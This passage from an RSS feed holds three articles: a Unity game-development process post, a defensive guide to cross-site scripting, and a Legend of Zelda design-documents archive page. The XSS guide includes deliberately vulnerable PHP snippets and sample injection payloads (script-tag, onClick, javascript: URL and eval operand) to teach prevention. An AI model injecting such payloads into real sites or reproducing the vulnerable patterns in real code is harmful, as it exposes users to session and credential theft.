developer, artist, or designer?</p><p>Here, I’ll give heuristics especially helpful for individual Software Engineers
building a game on their own as a side project, hobby, or proof-of-concept.</p><figure><p><span>
      <a href="https://blog.eyas.sh/static/f30aee52607429436af23a48362a8fd5/56037/irfan-simsar-wxWulfjN-G0-unsplash.jpg" target="_blank" rel="noopener">
    <span></span>
  <picture>
          <source srcset="https://blog.eyas.sh/static/f30aee52607429436af23a48362a8fd5/28a80/irfan-simsar-wxWulfjN-G0-unsplash.webp 400w,https://blog.eyas.sh/static/f30aee52607429436af23a48362a8fd5/8d2ea/irfan-simsar-wxWulfjN-G0-unsplash.webp 800w,https://blog.eyas.sh/static/f30aee52607429436af23a48362a8fd5/43d96/irfan-simsar-wxWulfjN-G0-unsplash.webp 1600w,https://blog.eyas.sh/static/f30aee52607429436af23a48362a8fd5/4293a/irfan-simsar-wxWulfjN-G0-unsplash.webp 2400w,https://blog.eyas.sh/static/f30aee52607429436af23a48362a8fd5/dc28f/irfan-simsar-wxWulfjN-G0-unsplash.webp 2448w" sizes="(max-width: 1600px) 100vw, 1600px" type="image/webp">
          <source srcset="https://blog.eyas.sh/static/f30aee52607429436af23a48362a8fd5/4cda9/irfan-simsar-wxWulfjN-G0-unsplash.jpg 400w,https://blog.eyas.sh/static/f30aee52607429436af23a48362a8fd5/c60e9/irfan-simsar-wxWulfjN-G0-unsplash.jpg 800w,https://blog.eyas.sh/static/f30aee52607429436af23a48362a8fd5/56dca/irfan-simsar-wxWulfjN-G0-unsplash.jpg 1600w,https://blog.eyas.sh/static/f30aee52607429436af23a48362a8fd5/111a0/irfan-simsar-wxWulfjN-G0-unsplash.jpg 2400w,https://blog.eyas.sh/static/f30aee52607429436af23a48362a8fd5/56037/irfan-simsar-wxWulfjN-G0-unsplash.jpg 2448w" sizes="(max-width: 1600px) 100vw, 1600px" type="image/jpeg">
          <img src="https://blog.eyas.sh/static/f30aee52607429436af23a48362a8fd5/56dca/irfan-simsar-wxWulfjN-G0-unsplash.jpg" alt="Scrum board, at an office" title="Scrum board, at an office" loading="lazy">
        </picture>
  </a>
    </span></p><figcaption><p>Photo by İrfan Simsar, <a href="https://unsplash.com/photos/wxWulfjN-G0">via unsplash</a>.</p></figcaption></figure><h2>Questions you should ask yourself</h2><p>Before we start, here are some questions you should ask yourself.</p><h3>Do you know <em>what</em> you’re building?</h3><p>Do you know what your game is about? Do you have a sense of what game mechanics
your game will have? Do you know what genre, controls, and themes this game will
have?</p><p>If <em>yes</em>, you’re ready to decide <strong><a href="#start-coding">where to start coding</a></strong>.
Otherwise, you have a few more questions to ask yourself.</p><h3>Do you <em>want</em> to know what you’re building?</h3><p>It’s totally fine not to have a project in mind! Maybe you’re prototyping.
Perhaps you’re throwing a bunch of mini-games on the wall and seeing what
sticks. Or you’re looking for inspiration and trying to implement random
mechanics to see what feels fun.</p><p><strong>If you’re hoping to begin working on a specific, cohesive game</strong>, you will
likely want to know what you’re building. Consider brainstorming and sketching
out an informal
<a href="https://en.wikipedia.org/wiki/Game_design_document">game design document</a>.
There are
<a href="https://www.google.com/search?q=game+design+document+template">plenty of templates</a>
of various levels of detail you could decide to use. Especially as a software
engineer toying with abstract ideas in my brain, I’ll start with a super
high-level GDD, covering the feel, themes, genre, and mechanics of the game I
have in mind. Maybe a few pictures or sketches for inspiration, and that’s it.
The key part of this exercise will be the list of mechanics I’m working on.</p><p><strong>If you want to prototype and experiment</strong>, you should already have a vague
sense of 1-2 mechanics that could be fun: Maybe unusual movement or a different
control scheme. It could be a traditional mechanic that you’re wondering how to
implement. For instance, I might decide to build a 3rd Person character and
camera controller to see the “feel” of it, experiment with it a tiny bit, and do
something smooth and polish that I feel good about. I might end up keeping that
code in my back pocket for later, or I might use play-through sessions with that
controller to move around a scene, add a few assets, and use that as a starting
place to see the “feel” various mechanics and designs.</p><h2 id="start-coding">I know the mechanics I care about. Now what?</h2><figure><p><span>
      <a href="https://blog.eyas.sh/static/b09385282504ca9896553256d7953148/e8f7f/iterative-development.jpg" target="_blank" rel="noopener">
    <span></span>
  <picture>
          <source srcset="https://blog.eyas.sh/static/b09385282504ca9896553256d7953148/28a80/iterative-development.webp 400w,https://blog.eyas.sh/static/b09385282504ca9896553256d7953148/dfbce/iterative-development.webp 499w" sizes="(max-width: 499px) 100vw, 499px" type="image/webp">
          <source srcset="https://blog.eyas.sh/static/b09385282504ca9896553256d7953148/4cda9/iterative-development.jpg 400w,https://blog.eyas.sh/static/b09385282504ca9896553256d7953148/e8f7f/iterative-development.jpg 499w" sizes="(max-width: 499px) 100vw, 499px" type="image/jpeg">
          <img src="https://blog.eyas.sh/static/b09385282504ca9896553256d7953148/e8f7f/iterative-development.jpg" alt="Spiral graph showing a representation of iterative development, between three axes: Plan, Build, and Test." title="Spiral graph showing a representation of iterative development, between three axes: Plan, Build, and Test." loading="lazy">
        </picture>
  </a>
    </span></p><figcaption><p>By Dave Gray, <a href="https://www.flickr.com/photos/davegray/6865783267">via Flickr</a>.
<a href="https://creativecommons.org/licenses/by-nd/2.0/">CC BY-ND 2.0</a>.</p></figcaption></figure><p>The goal of many iterative software development models is to de-risk software
development. You do that by failing fast and getting feedback early. In game
development, the primary metric for success is a feeling: the game should be
fun. So, when deciding what to start with when working on a game, one good
question to ask is: <em>“How can I see if this game is fun as soon as possible?”</em>
or <em>“How can I implement the ‘fun’ part of the game ASAP?”</em></p><p>One way to do that is to look at a game’s mechanics and implement them in some
order. The advice that resonates with me is implementing game mechanics in order
of what the most <em>“core”</em> mechanic first.</p><figure><p><span>
      <a href="https://blog.eyas.sh/static/94dc51f1aee3ae0db91cc4adef00ac50/a331c/scrolling-shooter-example.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
          <source srcset="https://blog.eyas.sh/static/94dc51f1aee3ae0db91cc4adef00ac50/28a80/scrolling-shooter-example.webp 400w,https://blog.eyas.sh/static/94dc51f1aee3ae0db91cc4adef00ac50/8d2ea/scrolling-shooter-example.webp 800w" sizes="(max-width: 800px) 100vw, 800px" type="image/webp">
          <source srcset="https://blog.eyas.sh/static/94dc51f1aee3ae0db91cc4adef00ac50/a3397/scrolling-shooter-example.png 400w,https://blog.eyas.sh/static/94dc51f1aee3ae0db91cc4adef00ac50/a331c/scrolling-shooter-example.png 800w" sizes="(max-width: 800px) 100vw, 800px" type="image/png">
          <img src="https://blog.eyas.sh/static/94dc51f1aee3ae0db91cc4adef00ac50/a331c/scrolling-shooter-example.png" alt="Example of a space scrolling shooter game" title="Example of a space scrolling shooter game" loading="lazy">
        </picture>
  </a>
    </span></p><figcaption><p>Space Scrolling Shooter. By Beyond2000, via
<a href="https://commons.wikimedia.org/wiki/File:RosAsmGameSpace.png">Wikimedia Commons</a>.
<a href="https://creativecommons.org/licenses/by-sa/3.0/deed.en">CC BY-SA 3.0</a>.</p></figcaption></figure><p>Let’s take <a href="https://en.wikipedia.org/wiki/Strikers_1945">Strikers 1945</a>—the
plane shooting game—as an example. Here’s my attempt at writing its main
mechanics in descending order of importance:</p><ol><li>Movement: Navigate a vertically scrolling world</li><li>Obstacles &amp; Dodging: Player can collide with stationary obstacles and debris</li><li>Shooting: Player can shoot straight ahead to defeat obstacles</li><li>Enemies: Enemies are moving obstacles that can shoot back</li><li>Player Health: A player can take a finite number of hits before losing the
game</li><li>Enemy Health: Some enemies take multiple shots to destroy</li><li>Boosts: The player can pick up boosts that improve health, shooting, etc.</li></ol><p>… and so on.</p><p>If I’m trying to develop <em>1945</em> from scratch, I will implement that list in that
order. The game’s mechanics build on each other, so I can only tell if shooting
is “fun” is if I can move around the screen and if there are obstacles I’m
trying to clear (otherwise, there’s no urgency to just pressing <em>Space</em> and
seeing projectiles coming out of a plane).</p><p>In simpler games, we might order our mechanics so that every new feature adds to
a game’s feel. So, with every new mechanic you add, you can play the game and
tell if it’s adding what you hope for it to add.</p><p>In more complex games, some of the “core” mechanics might be too ‘standard’ to
be “risky” <em>per se</em>, but you’ll still need the core mechanics implemented to
assess how fun the other mechanics are. You might choose to use a simpler
throwaway implementation, like a few lines of input-handling code and Unity’s
<code>CharacterController</code> component. You’ll want your core mechanics just smooth
enough that they don’t ruin the fun of the things you’ll layer on top of it.
Another approach here is to use the asset store. I’ve previously mentioned the
<a href="https://assetstore.unity.com/packages/tools/game-toolkits/ufps-ultimate-fps-106748?aid=1011leWs6">Ultimate FPS (UFPS)</a>
asset, which you might choose to use when building an FPS game, and move on to
implementing the combat or some more unique (but still “core” feature of the
gameplay first).</p><h2>So I picked a mechanic, but where do I start programming <em>within</em> this mechanic?</h2><p><em>Within</em> a mechanic, your traditional software engineering intuition becomes
helpful. I hope to spend subsequent articles discussing patterns that are
especially helpful in Unity, but here are a few to consider:</p><ul><li>Work within Unity’s Object-Component paradigm. If you’re adding a new
<em>capability</em> to your player, write it as its own component.</li><li><em>Tuning</em> is especially important in game development; representing a
mechanic’s interesting pieces as <em>configurable</em>, <em>serializable</em> data that
can be input to a component will help you playtest and iterate.</li><li>Don’t shy away from using plain-old data objects to represent core concepts
you’re working with. E.g., health, ammo information, or powerups. Make it
serializable if you want it passed around in the editor (or saved to disk
across sessions).</li><li>Where pieces of a concept don’t correspond to a single object in a scene,
consider using Scriptable Objects to do the jobs. Scriptable Objects
introduce many patterns that might help represent what you’re doing.</li></ul><p>A few articles I have already written might prove helpful:</p><ul><li><a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts/">Basic Concepts in Unity for Software Engineers</a></li><li><a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt2-six-practices/">6 Software Practices to Keep, Shed, and Adopt in Unity</a></li><li><a href="https://blog.eyas.sh/2020/09/patterns-in-unity-adventure-tutorial/">Making Sense of Patterns in Unity’s Adventure Game Tutorial</a></li><li><a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt5-object-component/">Understanding Unity Engine Objects</a></li></ul><p>You might also take a look at patterns covered in:</p><ul><li><a href="https://unity.com/how-to/architect-game-code-scriptable-objects">Three ways to architect your game with ScriptableObjects</a>,
via the Unity Blog (based on
<a href="https://www.youtube.com/watch?v=raQ3iHhE_Kk">his talk</a>)</li><li><a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt3-input-system/">Unity Input System, from Basic Principles</a></li><li><a href="https://blog.eyas.sh/2020/11/unity-for-engineers-pt10-1-pathfinding/">Pathfinding with NavMesh</a></li><li><a href="https://blog.eyas.sh/2020/11/unity-for-engineers-pt10-2-raycasting/">Physics Raycasting</a></li></ul><p>Once you have a stronger intuition of <em>how</em> you can represent different kinds of
data and abstractions, the reader’s initial comment also becomes the answer:</p><blockquote><p>It’s easy to think, “Well, okay, I need to write the DAO or controller, etc.”
But with games, I’m lost.</p></blockquote><p>Beyond learning about useful patterns and abstractions in game development to
make development clearer and cleaner, the real takeaway is to decide <em>what</em> to
work on at a macro-level.</p><h2>How much time should I spend on one mechanic?</h2><p>As you’re developing a mechanic, what’s a good signal you should move on to the
next on your list? Generally, that would be when you’re convinced:</p><ul><li>This mechanic <em>feels fun</em> and <em>adds to the game</em>,</li><li>Your implementation adds <em>just the
<a href="https://www.e4developer.com/2018/11/21/having-just-the-right-amount-of-technical-debt/">right amount</a></em>
of technical debt.</li></ul><p>Traditionally, folks will often say to worry about polish at the later stages of
your development. In his GDC 2016 micro-talk <em>“Pizzazz First, Polish Later”</em>,
Lee Perry makes a distinction in this traditional wisdom.</p><div> <p> <iframe title="" src="https://www.youtube.com/embed/d8QAVGeEj-U?rel=0" allowfullscreen=""></iframe> </p> </div><p>Certain levels of pizzazz might give you a better sense of your mechanic and how
fun it feels. A certain amount of polish or pizzazz can also help you see your
game in a new light and motivate you to keep going.
<a href="https://gameanalytics.com/blog/squeezing-more-juice-out-of-your-game-design/">Juice</a>
is another form of pizzazz; in certain dull moments of your game design, adding
juice might be a low-cost way to get back into the groove of things.</p><p>I hope the conflicting advice shows there isn’t a silver bullet on what to add
when. Rather—as in traditional software development—this choice is about a
series of trade-offs that depend on the developer, the project, and lots more.</p><h2>Are you developing a game or architecting systems?</h2><p>For some software engineers, we’re often drawn to writing code for systems that
seem <em>interesting</em>. Sometimes, I have a game in mind, but <em>really</em>, I’m
interested in implementing a cool inventory system where <em>everything</em> in the
game is an item. It might not be the core mechanic, but it might be the thing I
want to build.</p><p>It’s important to recognize when you’re not building a game but building a
system. If you just quit your job to be a full-time indie gamedev and have a
year of runway before your run out of cash, it is probably a bad idea to start
building a complex inventory system that you don’t even know you’ll need<sup id="fnref-1"><a href="#fn-1">1</a></sup>.
But if you’re programming on the side to flex your game development muscle, then
go right at it.</p><hr><p>I don’t think I’m qualified <em>per se</em> to answer the …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.eyas.sh/2021/02/unity-for-engineers-pt11-development-process/">https://blog.eyas.sh/2021/02/unity-for-engineers-pt11-development-process/</a></em></p>]]>
            </description>
            <link>https://blog.eyas.sh/2021/02/unity-for-engineers-pt11-development-process/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26216184</guid>
            <pubDate>Sun, 21 Feb 2021 19:11:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[XSS (Cross-Site Scripting) Attacks and Prevention in 2021]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26215987">thread link</a>) | @selteo
<br/>
February 21, 2021 | https://www.appsecmonkey.com/blog/xss-attack-and-prevention/ | <a href="https://web.archive.org/web/*/https://www.appsecmonkey.com/blog/xss-attack-and-prevention/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="what-are-xss-vulnerabilities-"><a href="#what-are-xss-vulnerabilities-">What are XSS vulnerabilities?</a></h2><p>XSS (Cross-Site Scripting) vulnerabilities arise when untrusted data gets interpreted as code in a web context. They usually result from: </p><ol><li>Generating HTML unsafely (parameterizing without encoding correctly).</li><li>Allowing users to edit HTML directly (WYSIWYG editors, for example).</li><li>Allowing users to upload HTML/SVG files and serving those back unsafely.</li><li>Using JavaScript unsafely (passing untrusted data into executable functions/properties).</li><li>Using outdated and vulnerable JavaScript frameworks.</li></ol><h2 id="how-to-prevent-xss-vulnerabilities-"><a href="#how-to-prevent-xss-vulnerabilities-">How to prevent XSS vulnerabilities?</a></h2><p>Follow these steps: </p><ol><li>Generate HTML safely using a templating engine, or use a static JavaScript frontend to avoid HTML generation altogether.</li><li>If you display untrusted HTML content on your website, purify it first and contain it in a sandboxed frame.</li><li>Serve all downloads with a proper Content-Disposition header to prevent user-supplied HTML/SVG from being rendered in your origin.</li><li>Don't pass untrusted data into executable JavaScript functions/properties such as <code>eval</code>, <code>innerHTML</code> or <code>href</code>.</li><li>Use well-known components with a good security history and keep them up to date.</li><li>Implement a proper CSP (Content Security Policy).</li></ol><h2 id="what-is-untrusted-data-"><a href="#what-is-untrusted-data-">What is untrusted data?</a></h2><p>Before we begin, let's quickly touch on this point. For the sake of this article, anything that is not controlled by your web application is untrusted data.</p><p>User input is one clear example. But you should also consider any data retrieved from external sources, even your database or API, as potentially dangerous and render it with proper safety measures.</p><p>A good rule of thumb is that if it's not a static resource, then it's untrusted data, at least on some level.</p><h2 id="why-are-xss-vulnerabilities-nasty-"><a href="#why-are-xss-vulnerabilities-nasty-">Why are XSS vulnerabilities nasty?</a></h2><p>There is sometimes a misconception that XSS vulnerabilities are low severity bugs. They are not. The power to execute JavaScript code on a website in other people's browsers is equivalent to logging in to the hosting server and changing the HTML files for the affected users.</p><p>As such, XSS attacks effectively make the attacker logged in as the target user, with the nasty addition of tricking the user into giving some information (such as their password) to the attacker, perhaps downloading and executing malware on the user's workstation.</p><p>And it's not like XSS vulnerabilities only affect individual users. Stored XSS affects everyone who visits the infected page, and reflected XSS can often <a href="">spread like wildfire</a>(<a href="https://en.wikipedia.org/wiki/Samy_(computer_worm)" target="_blank">https://en.wikipedia.org/wiki/Samy_(computer_worm)</a>.</p><h2 id="1--avoid-xss-by-generating-html-safely"><a href="#1--avoid-xss-by-generating-html-safely">1. Avoid XSS by generating HTML safely</a></h2><h3 id="a-simple-example"><a href="#a-simple-example">A simple example</a></h3><p>Here is a PHP script that is vulnerable to XSS: </p><pre><code><span>echo</span> <span>"&lt;p&gt;Search results for: "</span> <span>.</span> <span>$_GET</span><span>(</span><span>'search'</span><span>)</span> <span>.</span> <span>"&lt;/p&gt;"</span></code></pre><p>It is vulnerable because it generates HTML unsafely. The <code>search</code> parameter is not <em>encoded</em> correctly. An attacker can create a link such as the following, which would execute the attacker's JavaScript code on the website when the target opens it: </p><pre><code>https://www.example.com/?search=<span><span><span>&lt;</span>script</span><span>&gt;</span></span><span><span><span>alert</span><span>(</span><span>"XSS"</span><span>)</span></span></span><span><span><span>&lt;/</span>script</span><span>&gt;</span></span></code></pre><p>Results in HTML like: </p><pre><code><span><span><span>&lt;</span>p</span><span>&gt;</span></span>Search results for: <span><span><span>&lt;</span>script</span><span>&gt;</span></span><span><span><span>alert</span><span>(</span><span>"XSS"</span><span>)</span></span></span><span><span><span>&lt;/</span>script</span><span>&gt;</span></span><span><span><span>&lt;/</span>p</span><span>&gt;</span></span></code></pre><h3 id="the-importance-of-encoding"><a href="#the-importance-of-encoding">The importance of encoding</a></h3><p>So how then can you safely display the value <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code> in your HTML? The answer is: HTML entity encoding: </p><pre><code> <span>&amp;</span> <span>--</span><span>&gt;</span> <span>&amp;</span>amp<span>;</span>
 <span>&lt;</span> <span>--</span><span>&gt;</span> <span>&amp;</span>lt<span>;</span>
 <span>&gt;</span> <span>--</span><span>&gt;</span> <span>&amp;</span>gt<span>;</span>
 " <span>--</span><span>&gt;</span> <span>&amp;</span>quot<span>;</span>
 ' <span>--</span><span>&gt;</span> <span>&amp;</span>#x27<span>;</span></code></pre><p>PHP has a function called <code>htmlspecialchars</code> that performs this operation. So if we change our script a little bit (This is a horrible legacy approach, but it suffices now for demonstration), the resulting HTML will be safe.</p><pre><code><span>echo</span> <span>"&lt;p&gt;Search results for: "</span> <span>.</span> <span>htmlspecialchars</span><span>(</span><span>$_GET</span><span>(</span><span>'search'</span><span>)</span><span>)</span> <span>.</span> <span>"&lt;/p&gt;"</span></code></pre><p>Creates: </p><pre><code><span><span><span>&lt;</span>p</span><span>&gt;</span></span>Search results for: <span title="<">&amp;lt;</span>script<span title=">">&amp;gt;</span>alert(<span title="&quot;">&amp;quot;</span>XSS<span title="&quot;">&amp;quot;</span>)<span title="<">&amp;lt;</span>/script<span title=">">&amp;gt;</span><span><span><span>&lt;/</span>p</span><span>&gt;</span></span></code></pre><h3 id="encoding-contexts"><a href="#encoding-contexts">Encoding contexts</a></h3><p>HTML entity encoding is suitable only when you want to put something inside HTML tags or quoted HTML attributes. If your variables go inside JavaScript variables or URL addresses, you need another encoding function to avoid XSS.</p><p>So make sure you are using the proper encoding for the context.</p><h3 id="quotes-"><a href="#quotes-">Quotes!</a></h3><p>Don't forget to quote your HTML attributes and JavaScript variables or no encoding in the world will save you. The following PHP script <em>is</em> vulnerable to XSS because you can enter a value such as: <code>foo onClick=alert(1)</code>.</p><pre><code><span>echo</span> <span>'&lt;input type="text" value='</span> <span>.</span> <span>htmlspecialchars</span><span>(</span><span>$_GET</span><span>(</span><span>'search'</span><span>)</span><span>)</span> <span>.</span> <span>'&gt;&lt;/input&gt;'</span><span>;</span></code></pre><h3 id="don-t-put-untrusted-data-in-executable-fields"><a href="#don-t-put-untrusted-data-in-executable-fields">Don't put untrusted data in executable fields</a></h3><p>Also, never put untrusted data, encoded or not, within HTML attributes that execute something. These include <code>onClick</code>, <code>onMouseEnter</code> and friends, but also <code>src</code> and <code>href</code> because someone can put <code>javascript:alert("XSS")</code> for the value, and once again, you have an XSS vulnerability.</p><h3 id="scary--isn-t-it--but-don-t-worry-"><a href="#scary--isn-t-it--but-don-t-worry-">Scary, isn't it? But don't worry.</a></h3><p>There are quite a few things that can go wrong, and OWASP has curated a nice list of them here: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">Cross-Site Scripting Prevention Cheat Sheet</a></p><p>However, I wouldn't advise you to focus on that too much. After all, are we thrilled with code like this?</p><pre><code><span>echo</span> <span>"&lt;p&gt;Search results for: "</span> <span>.</span> <span>htmlspecialchars</span><span>(</span><span>$_GET</span><span>(</span><span>'search'</span><span>)</span><span>)</span> <span>.</span> <span>"&lt;/p&gt;"</span></code></pre><p>No. That isn't very good. Mixing presentation and code is so 90's.</p><pre><code>$ <span>rm</span> legacy.php</code></pre><h3 id="template-engines-to-the-rescue"><a href="#template-engines-to-the-rescue">Template engines to the rescue</a></h3><p>Instead, you should have your controller method somewhere render a template with the data you want to display. In the case of PHP, Twig is a good option. You would have <code>search.html.twig</code> with the following content: </p><pre><code><span><span><span><span>&lt;</span>p</span><span>&gt;</span></span>Search results for:</span> <span><span><span>{{</span></span><span>search</span><span><span>}}</span></span></span><span><span><span><span>&lt;/</span>p</span><span>&gt;</span></span></span></code></pre><p>And Twig would automatically encode your <code>search</code> parameter due to the template engine's automatic escaping.</p><ul><li><a href="https://symfony.com/doc/current/templates.html#output-escaping" target="_blank">https://symfony.com/doc/current/templates.html#output-escaping</a></li></ul><p>There are good template engines for all programming languages worth their salt. There's Jinja for Python, Thymeleaf for Java, and so on.</p><p>Just note that not all template engines are created equal. Some of them have an excellent and standard way to add HTML attributes, Thymeleaf's <code>th:attr</code> being one of them.</p><p>Then there are others where you have to be careful to quote your attributes.</p><p>And probably none of them will protect you from putting untrusted data into <code>href</code>, <code>src</code>, <code>onclick</code>, etc., so you still have to keep those in mind.</p><h3 id="---or-just-don-t-generate-html-at-all-"><a href="#---or-just-don-t-generate-html-at-all-">...or just don't generate HTML at all!</a></h3><p>Another great way not to deal with XSS when generating HTML is not to generate HTML. You can do this by creating a static HTML/JavaScript frontend and perhaps a backend API. Try <a href="https://www.appsecmonkey.com/blog/xss-attack-and-prevention/NextJS" target="_blank">https://nextjs.org/</a>, perhaps. It's pretty cool!</p><h2 id="2--avoid-xss-by-purifying-and-sandboxing-untrusted-content"><a href="#2--avoid-xss-by-purifying-and-sandboxing-untrusted-content">2. Avoid XSS by purifying and sandboxing untrusted content</a></h2><p>There are scenarios where you might want to render content that you don't fully trust. Maybe you want your users to create HTML in a WYSIWYG editor, or perhaps you want to download an HTML response from a third party and display it to the user.</p><p>Whatever the use case, the solution is the same. Purify and sandbox.</p><h3 id="purify"><a href="#purify">Purify</a></h3><p>Purifying is the act of removing any dangerous parts from an HTML string. You can do this on the client-side with <code>DOMPurify</code> or on the server-side with several tools such as the OWASP <code>Java HTML sanitizer</code> for Java or Mozzila's <code>bleach</code> for Python. Just pick a well-esteemed one.</p><ul><li><a href="https://github.com/cure53/DOMPurify" target="_blank">https://github.com/cure53/DOMPurify</a></li><li><a href="https://owasp.org/www-project-java-html-sanitizer/" target="_blank">https://owasp.org/www-project-java-html-sanitizer/</a></li><li><a href="https://github.com/mozilla/bleach" target="_blank">https://github.com/mozilla/bleach</a></li></ul><h3 id="sandbox"><a href="#sandbox">Sandbox</a></h3><p>Purifying is an excellent first step, but I wouldn't leave my website's security hanging on that alone. Luckily, there is a great control that we can use to display untrusted HTML content. May I present: sandboxed iframes!</p><ul><li><a href="https://www.w3schools.com/tags/att_iframe_sandbox.asp" target="_blank">https://www.w3schools.com/tags/att_iframe_sandbox.asp</a></li></ul><p>Sandboxed iframes run by default in their own <em>origin</em>. That is, if anything goes south in the frame, the frame cannot access your website. Also, sandboxed iframes by default prevent script execution and even links. Very useful for our purposes!</p><p>Here is an example of a non-sandboxed frame. If you run it, you should see an <code>alert</code> box with the message <em>evilness</em>.</p><p>Here is another fiddle with the <code>sandbox</code> attribute specified. Notice that this time the script does not get executed.</p><p>Such is the magic of sandboxed frames.</p><h2 id="3--avoid-xss-by-serving-downloads-properly"><a href="#3--avoid-xss-by-serving-downloads-properly">3. Avoid XSS by serving downloads properly</a></h2><p>When you allow users to upload files, there is a risk that they upload a malicious HTML, SVG, or similar file to your server. And suppose the file is then downloadable from your domain, and your web server serves it like any other HTML file. An attacker could upload a file with malicious JavaScript content and redirect unwitting users to the page.</p><p>To prevent this, serve all content that is not supposed to be rendered directly in a web browser with a proper <code>Content-Disposition</code> header. Like so: </p><pre><code><span>Content-Disposition</span><span>:</span> attachment; filename="filename.jpg"</code></pre><p>By specifying <code>attachment</code>, you tell browsers to show the save file dialog.</p><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition" target="_blank">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition</a></li></ul><h2 id="4--avoid-xss-by-using-javascript-safely"><a href="#4--avoid-xss-by-using-javascript-safely">4. Avoid XSS by using JavaScript safely</a></h2><p>Not all XSS vulnerabilities arise from unsafe HTML. Sometimes your JavaScript code can have XSS vulnerabilities in it.</p><p>To get one, all you have to do is pass untrusted data into a function or property that either executes something or changes the HTML, HREF, or SRC of something.</p><p>Here are a couple of examples just so that you get the idea.</p><ol><li>Passing untrusted data to jQuery <code>append</code> (which writes HTML).</li></ol><ol start="2"><li>Passing untrusted data to a <code>href</code> attribute. This example demonstrates that not even React applications are safe from XSS if you don't know what you are doing (click the user's homepage link to see).</li></ol><ol start="3"><li>Passing untrusted data to <code>eval</code> This is an example of passing untrusted data to a function that executes something. This simple calculator will execute code if you enter values like <code>;alert('xss');</code> into one of the operands.</li></ol><p>There is virtually an infinite list of functions and properties into which you shouldn't pass untrusted data. They include things like <code>innerHTML</code>, <code>outerHTML</code>, <code>setTimeout</code> and so on. And of course, the JavaScript libraries you use will have their own, just like the jQuery example above.</p><p>It's better to be safe than sorry, so check the documentation for the function/property before assigning/appending untrusted data into it.</p><h2 id="5--avoid-xss-by-using-well-known-javascript-libraries-and-keeping-them-up-to-date"><a href="#5--avoid-xss-by-using-well-known-javascript-libraries-and-keeping-them-up-to-date">5. Avoid XSS by using well-known JavaScript libraries and keeping them up to date</a></h2><p>Don't use NPM packages with a small number of downloads because they are more prone to have vulnerabilities or even contain purposefully …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.appsecmonkey.com/blog/xss-attack-and-prevention/">https://www.appsecmonkey.com/blog/xss-attack-and-prevention/</a></em></p>]]>
            </description>
            <link>https://www.appsecmonkey.com/blog/xss-attack-and-prevention/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26215987</guid>
            <pubDate>Sun, 21 Feb 2021 18:48:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Legend of Zelda Development Files]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26215892">thread link</a>) | @jdkee
<br/>
February 21, 2021 | https://www.gamingalexandria.com/wp/2019/07/legend-of-zelda-development-files/ | <a href="https://web.archive.org/web/*/https://www.gamingalexandria.com/wp/2019/07/legend-of-zelda-development-files/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<div id="primary">
		<main id="main" role="main">

		
<article id="post-7129">
	<!-- .entry-header -->

				<p><img width="752" height="440" src="https://www.gamingalexandria.com/wp/wp-content/uploads/2019/07/1986-LoZ-GA-Cover.png" alt="" loading="lazy" srcset="https://www.gamingalexandria.com/wp/wp-content/uploads/2019/07/1986-LoZ-GA-Cover.png 752w, https://www.gamingalexandria.com/wp/wp-content/uploads/2019/07/1986-LoZ-GA-Cover-300x176.png 300w" sizes="(max-width: 752px) 100vw, 752px">			</p>
	    	
	<div>
		

<h2><span id="design_documents"></span><span><strong>Design Documents</strong></span><span></span></h2>


<h2><span id="concept_art"></span><span><strong>Concept Art</strong></span><span></span></h2>
<div id="gallery-2"><figure>
			<p><a href="https://www.gamingalexandria.com/wp/wp-content/uploads/2019/07/1984-The-Legend-of-Zelda-Mockup-01.jpg"><img width="150" height="150" src="https://www.gamingalexandria.com/wp/wp-content/uploads/2019/07/1984-The-Legend-of-Zelda-Mockup-01-150x150.jpg" alt="“First-Person Dungeon Select” (Untitled), c. 1984 (Author Unknown). An in-engine concept for The Legend of Zelda in it’s earliest stages where a first person perspective was being considered. This mock-up was made with the use of Hudson’s Family BASIC cartridge for a quick visual layout of what this game could potentially look like. This screen would have enabled the players to select their dungeon rather than wandering on the overworld. (Source: Hyrule Encyclopedia)" loading="lazy" srcset="https://www.gamingalexandria.com/wp/wp-content/uploads/2019/07/1984-The-Legend-of-Zelda-Mockup-01-150x150.jpg 150w, https://www.gamingalexandria.com/wp/wp-content/uploads/2019/07/1984-The-Legend-of-Zelda-Mockup-01-400x400.jpg 400w" sizes="(max-width: 150px) 100vw, 150px"></a>
			</p></figure>
		</div>

<h2><span id="technical_documents"></span><span><strong>Technical Documents</strong></span><span></span></h2>



<h2><span id="sources"></span><span>Sources</span><span></span></h2>
<p><span><a href="https://www.nintendo.co.uk/Iwata-Asks/Iwata-Asks-The-Legend-of-Zelda-Spirit-Tracks/Iwata-Asks-Zelda-Handheld-History-/Bonus-1-Ancient-Documents-from-1985/Bonus-1-Ancient-Documents-from-1985-233949.html">Iwata Asks, Bonus 1: Ancient Documents from 1985.</a> December 3, 2009.</span></p>
<p><span><a href="https://www.nintendo.co.uk/News/2016/December/Take-a-look-behind-the-scenes-with-design-documents-from-The-Legend-of-Zelda--1169414.html">Nintendo UK, Take a look behind-the-scenes with design documents from The Legend of Zelda!</a> December 21, 2016</span></p>
<p><span>Hyrule Historia. Nintendo. ISBN-10 4-09-227159-X. December 21, 2011.</span></p>
			</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article><!-- #post-## -->
	<nav role="navigation">
		<h2>Post navigation</h2>
